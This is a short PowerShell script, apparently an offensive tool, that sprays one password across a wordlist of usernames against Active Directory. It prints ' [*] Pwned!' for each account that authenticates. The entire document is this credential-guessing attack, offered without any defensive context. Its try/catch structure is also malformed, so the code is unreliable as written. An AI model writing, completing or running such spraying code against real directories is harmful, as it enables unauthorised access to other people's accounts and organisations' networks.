
Function Test-ADAuth {
    param($username, $password)
    (New-Object DirectoryServices.DirectoryEntry "",$username,$password).psbase.name -ne $null
}

function Spray {
    param ($pass, $wordlist)
    try{
    foreach ($uname in [System.IO.File]::ReadLines($wordlist)){
    if (Test-ADAuth -username $uname -password $pass)
    {
        echo $uname + ' [*] Pwned!'
    }
     catch 
    {
        Write-Output "$PSItem"
    }
}
}
}
